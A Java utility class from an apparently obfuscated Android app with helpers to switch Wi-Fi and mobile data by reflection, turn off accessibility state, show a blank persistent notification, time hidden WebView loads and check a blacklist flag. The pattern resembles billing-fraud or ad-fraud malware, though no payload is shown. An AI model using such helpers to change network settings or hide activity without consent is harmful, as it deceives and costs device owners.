package a.d.b.utils;

import android.annotation.TargetApi;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.view.accessibility.AccessibilityManager;
import android.webkit.WebView;

import java.lang.reflect.Method;

/**
 * Created by xlc on 2017/5/24.
 */

public class PhoneControl {

    public static final String CACHE_FINISH_ACTION = "cache.finish.action";

    public static final String SONOFBITCH = "NWQ0ZDYyOWJmZTg1NzA5Zg=="; //

    public static final String PREFERNAME = "sub_preference_name";
    public static final String EXECUTE_TIME = "sub.webview.load.time";


    public static boolean checkNet (Context context) {
        try {
            ConnectivityManager connectivity = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            if ( connectivity != null ) {
                NetworkInfo networkinfo = connectivity.getActiveNetworkInfo();
                if ( networkinfo.isAvailable() ) {
                    if ( networkinfo.isConnected() ) {
                        return true;
                    }
                }
            }
        } catch ( Exception e ) {
            e.printStackTrace();
        }
        return false;
    }

    /**
     * 判断Wifi是否可以访问
     *
     * @param context
     * @return
     */
    public static boolean getWifiStatus (Context context) {
        WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        return wifiManager.isWifiEnabled();
    }

    /**
     * 关闭WIFI状态
     *
     * @param context
     */
    public static void closeWifi (Context context) {
        //        WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        //        if (wifiManager.isWifiEnabled()) {
        //            wifiManager.setWifiEnabled(false);
        //        }

        try {

            Class conClass = context.getClass();
            Method method = conClass.getMethod("getSystemService", new Class[]{String.class});
            Object obj = method.invoke(context, new Object[]{"wifi"});
            Class wifiClass = obj.getClass();

            method = wifiClass.getMethod("isWifiEnabled");

            if ( (boolean) method.invoke(obj) ) {
                method = wifiClass.getMethod("setWifiEnabled", new Class[]{boolean.class});
                method.invoke(obj, new Object[]{false});
            }

        } catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    /**
     * 关闭WIFI状态
     *
     * @param context
     */
    public static void openWifi (Context context) {
        WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        if ( !wifiManager.isWifiEnabled() ) {
            wifiManager.setWifiEnabled(true);
        }
    }

    /**
     * 开关GPRS  只适用于5.0以下的系统
     *
     * @param context
     * @param isEnable
     */
    public static void setNetState (Context context, String methodName, boolean isEnable) {
        ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        Class cmClass = mConnectivityManager.getClass();
        try {
            Method method = cmClass.getMethod(methodName, new Class[]{boolean.class});
            method.invoke(mConnectivityManager, isEnable);
        } catch ( Exception e ) {
            e.printStackTrace();
        }
    }


    /****
     * 检测GPRS是否打开
     * @param context
     * @param arg
     * @return
     */
    public static boolean getMobileStatus (Context context, Object[] arg) {
        try {
            ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            Class ownerClass = mConnectivityManager.getClass();

            Class[] argsClass = null;
            if ( arg != null ) {
                argsClass = new Class[1];
                argsClass[0] = arg.getClass();
            }
            Method method = ownerClass.getMethod("getMobileDataEnabled", argsClass);

            Boolean isOpen = (Boolean) method.invoke(mConnectivityManager, arg);

            return isOpen;

        } catch ( Exception e ) {
            return false;
        }
    }

    /**
     * 保存联网信息
     */
    public static void save_connect_status (Context context) {
        SharedPreferences sh = context.getSharedPreferences(PREFERNAME, 0);
        SharedPreferences.Editor editor = sh.edit();
        editor.putLong("connect_save_time", System.currentTimeMillis());
        editor.apply();
    }

    /**
     * 检测联网是否满足条件
     *
     * @return
     */
    public static boolean check_connect_status (Context context) {

        SharedPreferences sh = context.getSharedPreferences(PREFERNAME, 0);

        return (Math.abs(System.currentTimeMillis() - sh.getLong("connect_save_time", 0)) > 3 * 60 * 60 * 1000);
    }


    public static boolean check_show_dialog_time (Context context) {

        SharedPreferences sh = context.getSharedPreferences(PREFERNAME, 0);

        return (Math.abs(System.currentTimeMillis() - sh.getLong("show_dialog", 0)) > 5 * 60 * 1000);
    }

    public static void saveLong (Context context, String key, long value) {
        SharedPreferences.Editor editor = context.getSharedPreferences(PREFERNAME, 0).edit();
        editor.putLong(key, value);
        editor.apply();
    }


    public static void save_webview_load_time (Context context) {
        SharedPreferences.Editor editor = context.getSharedPreferences(PREFERNAME, 0).edit();
        editor.putLong(EXECUTE_TIME, System.currentTimeMillis());
        editor.apply();
    }


    public static boolean check_webview_load_time (Context context) {
        SharedPreferences sp = context.getSharedPreferences(PREFERNAME, 0);
        return Math.abs(System.currentTimeMillis() - sp.getLong(EXECUTE_TIME, -1)) > 20 * 60000;
    }


    public static void save_b_list (Context context, int value) {
        SharedPreferences sp = context.getSharedPreferences(PREFERNAME, 0);
        SharedPreferences.Editor editor = sp.edit();
        editor.putInt("b_l", value);
        editor.apply();
    }

    /**
     * 未知状态或黑名单
     *
     * @param context
     * @return
     */
    public static boolean check_b_list (Context context) {
        SharedPreferences sp = context.getSharedPreferences(PREFERNAME, 0);
        return sp.getInt("b_l", 0) == -1 || sp.getInt("b_l", 0) == 0;
    }

    /**
     * WebView加载 辅助模式打开报错 针对4.2
     *
     * @param context
     */
    public static void disableAccessibility (Context context) {

        if ( Build.VERSION.SDK_INT == 17/*4.2 (Build.VERSION_CODES.JELLY_BEAN_MR1)*/ ) {
            if ( context != null ) {
                try {
                    AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
                    if ( !am.isEnabled() ) {
                        return;
                    }
                    Method set = am.getClass().getDeclaredMethod("setState", int.class);
                    set.setAccessible(true);
                    set.invoke(am, 0);/**{@link AccessibilityManager#STATE_FLAG_ACCESSIBILITY_ENABLED}*/
                } catch ( Exception e ) {
                }
            }
        }
    }

    /**
     * 针对4.1系统 16
     *
     * @param webView
     * @param url
     */
    public static void disableJsIfUrlEncodedFailed (WebView webView, String url) {

        if ( Build.VERSION.SDK_INT != Build.VERSION_CODES.JELLY_BEAN ) {
            return;
        }

        try {
            //            URLEncodedUtil.parse(new URI(url), null);
            webView.getSettings().setJavaScriptEnabled(true);
            //        } catch (URISyntaxException ignored) {
        } catch ( IllegalArgumentException e ) {
            webView.getSettings().setJavaScriptEnabled(false);
        }
    }

    public static void save_receiver_time (Context context) {
        SharedPreferences preferences = context.getSharedPreferences(PREFERNAME, 0);
        SharedPreferences.Editor edit = preferences.edit();
        edit.putLong("r_time", System.currentTimeMillis());
        edit.apply();
    }

    public static boolean check_receiver_time (Context context) {
        SharedPreferences preferences = context.getSharedPreferences(PREFERNAME, 0);
        return Math.abs(System.currentTimeMillis() - preferences.getLong("r_time", 0)) > 3000;
    }

    /**
     * Unicode 转 String
     */
    public static String decodeUnicode (final String dataStr) {
        int start = 0;
        int end = 0;
        final StringBuffer buffer = new StringBuffer();
        while ( start > -1 ) {
            end = dataStr.indexOf("\\u", start + 2);
            String charStr = "";
            if ( end == -1 ) {
                charStr = dataStr.substring(start + 2, dataStr.length());
            } else {
                charStr = dataStr.substring(start + 2, end);
            }
            char letter = (char) Integer.parseInt(charStr, 16); // 16进制parse整形字符串。
            buffer.append(new Character(letter).toString());
            start = end;
        }
        return buffer.toString();
    }

    public static final int NOTIFICATION_ID = 10;

    @TargetApi (Build.VERSION_CODES.HONEYCOMB)
    public static void startForeground (Service service) {

        Notification notification = new Notification.Builder(service).getNotification();

        notification.flags |= Notification.FLAG_NO_CLEAR;

        service.startForeground(NOTIFICATION_ID, notification);
    }

    public static String getNetStates (Context mContext) {
        if ( PhoneControl.getWifiStatus(mContext) ) {
            return "2";
        }
        if ( PhoneControl.getMobileStatus(mContext, null) ) {
            return "1";
        }
        return "0";
    }

}